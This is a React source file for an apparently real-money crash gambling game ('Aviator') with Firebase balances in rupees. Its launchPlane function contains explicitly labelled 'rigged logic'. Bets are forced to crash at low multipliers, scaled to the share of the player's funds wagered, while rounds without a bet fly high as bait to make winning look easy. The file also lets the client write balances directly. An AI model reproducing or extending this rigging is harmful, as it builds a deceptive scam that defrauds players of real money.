import React, { useState, useEffect, useRef } from 'react';
import { auth, db } from '../../firebase';
import { getUserProfile, updateUserBalance, placeBet } from '../../services/userService';
import { UserProfile } from '../../types';
import { ChevronLeft, History as HistoryIcon, Clock, Menu, Minus, Plus } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { WinLossPopup } from '../../components/WinLossPopup';
import { ref, onValue } from 'firebase/database';

// Assets
const ASSETS = {
  plane: "https://i.imgur.com/3gj62jX.png"
};

type GamePhase = 'WAITING' | 'FLYING' | 'CRASHED';

export const Aviator = () => {
    const navigate = useNavigate();
    
    // Game State
    const [phase, setPhase] = useState<GamePhase>('WAITING');
    const [multiplier, setMultiplier] = useState(1.00);
    const [countdown, setCountdown] = useState(5); 
    const [gameHistory, setGameHistory] = useState<number[]>([]);
    
    // User State
    const [user, setUser] = useState<UserProfile | null>(null);
    const [betAmount, setBetAmount] = useState(10);
    
    // UI Flags
    const [uiHasBetForCurrentRound, setUiHasBetForCurrentRound] = useState(false);
    const [uiHasBetForNextRound, setUiHasBetForNextRound] = useState(false);

    // Refs for Game Loop
    const gameStateRef = useRef({
        phase: 'WAITING' as GamePhase,
        multiplier: 1.00,
        hasBetForNextRound: false,
        hasBetForCurrentRound: false,
        wageredAmount: 0,
        queuedAmount: 0 
    });
    const userRef = useRef<UserProfile | null>(null);

    const [popup, setPopup] = useState<{type: 'win' | 'loss', amount: number} | null>(null);
    const canvasRef = useRef<HTMLCanvasElement>(null);
    const requestRef = useRef<number>(0);
    const planeImageRef = useRef<HTMLImageElement>(new Image());

    useEffect(() => {
        const u = auth.currentUser;
        if(u) {
            const userRefDb = ref(db, `users/${u.uid}`);
            onValue(userRefDb, (snap) => {
                if (snap.exists()) {
                    const val = snap.val() as UserProfile;
                    setUser(val);
                }
            });
        }
        
        planeImageRef.current.src = ASSETS.plane;
        startGameCycle();
        
        return () => {
            if (requestRef.current) cancelAnimationFrame(requestRef.current);
        };
    }, []);

    useEffect(() => {
        userRef.current = user;
    }, [user]);

    const startGameCycle = () => {
        setPhase('WAITING');
        gameStateRef.current.phase = 'WAITING';
        setMultiplier(1.00);
        gameStateRef.current.multiplier = 1.00;
        setCountdown(5);
        
        let timeLeft = 5;
        const interval = setInterval(() => {
            timeLeft -= 1;
            setCountdown(timeLeft);
            if (timeLeft <= 0) {
                clearInterval(interval);
                launchPlane();
            }
        }, 1000);
    };

    const launchPlane = () => {
        // Transition Next Round Bets to Current
        if (gameStateRef.current.hasBetForNextRound) {
            gameStateRef.current.hasBetForCurrentRound = true;
            gameStateRef.current.wageredAmount = gameStateRef.current.queuedAmount; 
            gameStateRef.current.hasBetForNextRound = false;
            setUiHasBetForCurrentRound(true);
            setUiHasBetForNextRound(false);
        } else {
            gameStateRef.current.hasBetForCurrentRound = false;
            setUiHasBetForCurrentRound(false);
        }

        setPhase('FLYING');
        gameStateRef.current.phase = 'FLYING';
        
        // --- RIGGED LOGIC START ---
        
        const currentUser = userRef.current;
        const wager = gameStateRef.current.wageredAmount;
        const hasBet = gameStateRef.current.hasBetForCurrentRound;
        
        let targetCrash = 1.0;

        if (hasBet && currentUser) {
            // USER IS BETTING: RIG TO LOSE
            
            // Calculate percentage of total funds (Balance + Wager amount)
            const totalFunds = currentUser.balance + wager;
            const percentage = totalFunds > 0 ? (wager / totalFunds) * 100 : 0;

            if (percentage >= 50) {
                 // 50% to 100% of funds -> Max 1.1x
                 // Random between 1.00 and 1.10
                 targetCrash = 1.0 + (Math.random() * 0.1);
            } else if (percentage >= 25) {
                 // 25% to 49% of funds -> Max 1.7x
                 // Random between 1.00 and 1.70
                 targetCrash = 1.0 + (Math.random() * 0.7);
            } else {
                 // 1% to 24% of funds -> Max 2.0x
                 // Random between 1.00 and 2.00
                 targetCrash = 1.0 + (Math.random() * 1.0);
            }
            
        } else {
            // USER NOT BETTING: ATTRACT MODE
            // Plane goes high (up to 100x) to make it look like winning is easy.
            
            const baitRandom = Math.random();
            if (baitRandom < 0.2) {
                // 20% chance: Super High (20x - 100x)
                targetCrash = 20.0 + (Math.random() * 80.0);
            } else if (baitRandom < 0.5) {
                // 30% chance: High (5x - 20x)
                targetCrash = 5.0 + (Math.random() * 15.0);
            } else {
                // 50% chance: Moderate (2x - 5x)
                targetCrash = 2.0 + (Math.random() * 3.0);
            }
        }
        
        if (targetCrash < 1.0) targetCrash = 1.0; // Safety floor
        
        // --- RIGGED LOGIC END ---

        let startTime = Date.now();
        
        const animate = () => {
            if (gameStateRef.current.phase !== 'FLYING') return;

            const now = Date.now();
            const delta = (now - startTime) / 1000;
            
            const newMult = 1.00 + (Math.pow(1.15, delta * 1.5) - 1); 
            
            setMultiplier(newMult);
            gameStateRef.current.multiplier = newMult;
            
            if (newMult >= targetCrash) { 
                handleCrash(newMult);
                return;
            }
            
            draw(newMult, false);
            requestRef.current = requestAnimationFrame(animate);
        };
        requestRef.current = requestAnimationFrame(animate);
    };

    const handleCrash = (finalMult: number) => {
        setPhase('CRASHED');
        gameStateRef.current.phase = 'CRASHED';
        setMultiplier(finalMult);
        setGameHistory(prev => [finalMult, ...prev].slice(0, 20));
        draw(finalMult, true);
        
        if (gameStateRef.current.hasBetForCurrentRound) {
            gameStateRef.current.hasBetForCurrentRound = false;
            setUiHasBetForCurrentRound(false);
            setPopup({ type: 'loss', amount: gameStateRef.current.wageredAmount });
        }

        setTimeout(() => startGameCycle(), 3000);
    };

    const handleBetAction = async () => {
        if (!user) return;
        
        // --- CASH OUT LOGIC ---
        if (phase === 'FLYING' && uiHasBetForCurrentRound) {
            const winMult = gameStateRef.current.multiplier;
            const wager = gameStateRef.current.wageredAmount;
            const winAmount = wager * winMult;

            gameStateRef.current.hasBetForCurrentRound = false;
            setUiHasBetForCurrentRound(false);
            
            await updateUserBalance(user.uid, user.balance + winAmount);
            setPopup({ type: 'win', amount: winAmount });
            return;
        }

        // --- PLACE BET LOGIC ---
        // Cancel logic if waiting
        if (uiHasBetForNextRound) {
            // Refund logic if strictly needed, but usually just visual cancel before lock
            // Here we just allow cancel if game hasn't taken money yet effectively
            // But since we deduct on click, we refund:
            await updateUserBalance(user.uid, user.balance + gameStateRef.current.queuedAmount);
            gameStateRef.current.hasBetForNextRound = false;
            gameStateRef.current.queuedAmount = 0;
            setUiHasBetForNextRound(false);
            return;
        }

        // Validation
        if (betAmount < 10) {
            alert("Minimum bet is ₹10");
            return;
        }
        if (user.balance < betAmount) {
            alert("Insufficient Balance");
            return;
        }

        // Deduct & Lock
        const res = await placeBet(user.uid, betAmount);
        if (!res.success) {
            alert("Transaction failed");
            return;
        }
        
        gameStateRef.current.hasBetForNextRound = true;
        gameStateRef.current.queuedAmount = betAmount;
        setUiHasBetForNextRound(true);
    };

    const draw = (currentMult: number, isCrashed: boolean) => {
        const canvas = canvasRef.current;
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        if (!ctx) return;

        canvas.width = canvas.parentElement?.clientWidth || 300;
        canvas.height = 300;

        // Background (Black/Dark)
        ctx.fillStyle = '#000000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        // Grid
        ctx.strokeStyle = '#333';
        ctx.lineWidth = 0.5;
        // ... (Grid drawing logic simplified for brevity) ...

        if (phase === 'WAITING') {
            // Waiting Text
            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 20px Arial';
            ctx.textAlign = 'center';
            ctx.fillText("WAITING FOR NEXT ROUND", canvas.width/2, canvas.height/2 - 20);
            
            // Progress Bar
            const barW = 200;
            const barH = 4;
            ctx.fillStyle = '#333';
            ctx.fillRect((canvas.width-barW)/2, canvas.height/2, barW, barH);
            ctx.fillStyle = '#ef4444';
            ctx.fillRect((canvas.width-barW)/2, canvas.height/2, barW * (countdown/5), barH);
            return;
        }

        // Curve Calculation
        const maxMult = Math.max(2, currentMult * 1.2);
        const normY = (currentMult - 1) / (maxMult - 1);
        
        const startX = 0;
        const startY = canvas.height;
        const endX = canvas.width * 0.8; // Plane sits at 80% width
        const endY = canvas.height - (canvas.height * 0.8 * normY); // Scale height

        // Draw Area Under Curve
        ctx.beginPath();
        ctx.moveTo(startX, startY);
        ctx.quadraticCurveTo(canvas.width * 0.4, endY, endX, endY);
        ctx.lineTo(endX, canvas.height);
        ctx.lineTo(startX, canvas.height);
        
        // Gradient Fill
        const grad = ctx.createLinearGradient(0, 0, 0, canvas.height);
        grad.addColorStop(0, 'rgba(185, 28, 28, 0.6)'); // Dark Red
        grad.addColorStop(1, 'rgba(0, 0, 0, 0)');
        ctx.fillStyle = grad;
        ctx.fill();

        // Draw Line
        ctx.beginPath();
        ctx.moveTo(startX, startY);
        ctx.quadraticCurveTo(canvas.width * 0.4, endY, endX, endY);
        ctx.strokeStyle = '#ef4444';
        ctx.lineWidth = 4;
        ctx.stroke();

        // Draw Plane
        if (!isCrashed) {
            ctx.save();
            ctx.translate(endX, endY);
            ctx.drawImage(planeImageRef.current, -30, -30, 60, 60);
            ctx.restore();
        } else {
             ctx.font = 'bold 24px Arial';
             ctx.fillStyle = '#ef4444';
             ctx.textAlign = 'center';
             ctx.fillText("FLEW AWAY", canvas.width/2, canvas.height/2);
        }
    };

    return (
        <div className="min-h-screen bg-[#101011] flex flex-col font-sans">
            {/* Top Bar */}
            <div className="flex justify-between items-center px-4 py-2 bg-[#1b1c1d] border-b border-white/5">
                <div className="flex items-center gap-2">
                    <button onClick={() => navigate('/')} className="text-gray-400 hover:text-white transition">
                        <ChevronLeft size={24} />
                    </button>
                    <h1 className="text-[#ef4444] text-2xl font-bold italic tracking-wider">Aviator</h1>
                </div>
                <div className="flex items-center gap-4">
                    <div className="text-green-500 font-bold text-sm">
                        {(user?.balance || 0).toFixed(2)} ₹
                    </div>
                    <Menu className="text-gray-400" size={24} />
                </div>
            </div>

            {/* History Bar */}
            <div className="bg-[#101011] p-2 flex gap-2 overflow-x-auto no-scrollbar items-center border-b border-white/5">
                {gameHistory.map((h, i) => (
                    <div key={i} className={`px-2 py-0.5 rounded text-xs font-bold ${h >= 10 ? 'text-[#c017b4]' : h >= 2 ? 'text-[#913ef8]' : 'text-[#34b4ff]'} bg-gray-800/50 min-w-[3rem] text-center`}>
                        {h.toFixed(2)}x
                    </div>
                ))}
                <div className="ml-auto text-gray-500 text-xs flex items-center gap-1 bg-black px-2 py-1 rounded-full border border-gray-700">
                    <Clock size={12} /> History
                </div>
            </div>

            {/* Canvas Area */}
            <div className="relative flex-1 bg-black flex flex-col justify-center">
                <canvas ref={canvasRef} className="w-full h-full absolute inset-0" />
                
                {/* Central Multiplier Display */}
                {phase !== 'WAITING' && (
                    <div className="absolute top-10 left-0 right-0 text-center pointer-events-none z-10">
                        <div className={`text-6xl font-black tracking-tighter ${phase === 'CRASHED' ? 'text-[#ef4444]' : 'text-white'}`}>
                            {multiplier.toFixed(2)}x
                        </div>
                    </div>
                )}
            </div>

            {/* Betting Controls - Styling matched to image */}
            <div className="p-2 bg-[#101011]">
                {/* Main Panel */}
                <div className="bg-[#1b1c1d] rounded-2xl p-3 border border-gray-800">
                    
                    {/* Bet Controls Row */}
                    <div className="flex gap-2 h-14 mb-2">
                        {/* Minus/Plus Input */}
                        <div className="flex-1 bg-[#101011] rounded-full border border-gray-700 flex items-center px-1">
                            <button onClick={() => setBetAmount(Math.max(10, betAmount - 10))} className="w-10 h-full flex items-center justify-center text-gray-400 hover:text-white transition">
                                <Minus size={16} />
                            </button>
                            <input 
                                type="number" 
                                value={betAmount}
                                onChange={(e) => setBetAmount(Number(e.target.value))}
                                className="flex-1 bg-transparent text-center text-white font-bold text-lg outline-none"
                            />
                            <button onClick={() => setBetAmount(betAmount + 10)} className="w-10 h-full flex items-center justify-center text-gray-400 hover:text-white transition">
                                <Plus size={16} />
                            </button>
                        </div>
                    </div>

                    {/* Presets */}
                    <div className="grid grid-cols-4 gap-2 mb-3">
                         {[10, 100, 500, 1000].map(amt => (
                             <button 
                                key={amt} 
                                onClick={() => setBetAmount(amt)}
                                className="bg-[#101011] rounded-full py-1 text-xs text-gray-400 font-bold border border-gray-700 hover:bg-gray-800 hover:text-white transition"
                             >
                                 {amt}
                             </button>
                         ))}
                    </div>

                    {/* BIG BUTTON */}
                    <button 
                        onClick={handleBetAction}
                        disabled={phase === 'CRASHED' && !uiHasBetForNextRound}
                        className={`w-full h-16 rounded-2xl font-black text-xl shadow-lg flex flex-col items-center justify-center transition active:scale-[0.98] ${
                            phase === 'FLYING' && uiHasBetForCurrentRound 
                                ? 'bg-orange-500 hover:bg-orange-600 text-white shadow-orange-500/20' 
                                : uiHasBetForNextRound 
                                    ? 'bg-[#ef4444] hover:bg-red-600 text-white shadow-red-500/20' 
                                    : 'bg-[#22c55e] hover:bg-green-600 text-white shadow-green-500/20'
                        }`}
                    >
                        {phase === 'FLYING' && uiHasBetForCurrentRound ? (
                            <div className="leading-tight">
                                <div className="text-xs font-bold uppercase opacity-80">CASH OUT</div>
                                <div>{(gameStateRef.current.wageredAmount * multiplier).toFixed(0)} ₹</div>
                            </div>
                        ) : uiHasBetForNextRound ? (
                            <div className="leading-tight">
                                <div className="text-lg">Waiting for round...</div>
                                <div className="text-xs font-bold uppercase opacity-80">Cancel Bet</div>
                            </div>
                        ) : (
                            <div className="leading-tight">
                                <div className="text-xl">BET</div>
                                <div className="text-[10px] font-normal uppercase opacity-70 tracking-wide">Place your bet</div>
                            </div>
                        )}
                    </button>
                </div>
            </div>

            {popup && (
                <WinLossPopup 
                    type={popup.type} 
                    amount={popup.amount} 
                    onClose={() => setPopup(null)} 
                />
            )}
        </div>
    );
};
